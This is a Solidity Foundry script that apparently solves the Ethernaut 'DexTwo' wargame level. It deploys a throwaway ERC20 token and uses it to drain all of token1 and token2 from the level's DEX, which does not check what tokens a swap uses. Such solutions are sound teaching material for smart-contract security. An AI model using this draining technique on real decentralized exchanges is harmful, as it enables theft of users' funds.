// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/DexTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract AttackerERC20 is ERC20 {
    uint256 constant INITIAL_SUPPLY = 1000;

    constructor() ERC20("Attacker", "Attacker") {
        _mint(msg.sender, INITIAL_SUPPLY);
    }
}

contract DexTwoScript is Script {
    address constant ETHERNAUT_CONTRACT_ADDRESS = 0x0d4C8c2C5B02aA8a120c602CF2ebb822BF55213f;
    DexTwo public dex = DexTwo(payable(ETHERNAUT_CONTRACT_ADDRESS));

    address token1Address;
    address token2Address;
    SwappableTokenTwo token1;
    SwappableTokenTwo token2;

    uint256 playerToken1Bal;
    uint256 playerToken2Bal;
    uint256 dexToken1Bal;
    uint256 dexToken2Bal;

    AttackerERC20 attackerToken;

    address PLAYER = vm.envAddress("MY_ADDRESS");

    function run() external {
        token1Address = dex.token1();
        token2Address = dex.token2();

        token1 = SwappableTokenTwo(token1Address);
        token2 = SwappableTokenTwo(token2Address);

        dexToken1Bal = token1.balanceOf(address(dex));
        dexToken2Bal = token2.balanceOf(address(dex));

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // deploy AttackerERC20
        attackerToken = new AttackerERC20();

        // approve dex for max tokens (1 & 2)
        uint256 max = type(uint256).max;
        dex.approve(address(dex), max);

        // approve dex for attackerToken
        attackerToken.approve(address(dex), max);

        // transfer attackerToken to DEX
        uint256 amount = 100;

        attackerToken.transfer(address(dex), amount);

        // swap amount * attackerToken for all token1
        dex.swap(address(attackerToken), token1Address, amount);

        // swap 2 * amount * attackerToken for all token2
        amount = 2 * amount;
        dex.swap(address(attackerToken), token2Address, amount);

        // remove dex approval for tokens (1 & 2)
        dex.approve(address(dex), 0);

        // remove dex approval for attackerToken
        attackerToken.approve(address(dex), 0);

        vm.stopBroadcast();

        playerToken1Bal = token1.balanceOf(PLAYER);
        playerToken2Bal = token2.balanceOf(PLAYER);
        console.log("playerToken1Bal", playerToken1Bal);
        console.log("playerToken2Bal", playerToken2Bal);

        dexToken1Bal = token1.balanceOf(address(dex));
        dexToken2Bal = token2.balanceOf(address(dex));
        console.log("dexToken1Bal", dexToken1Bal);
        console.log("dexToken2Bal", dexToken2Bal);
    }
}
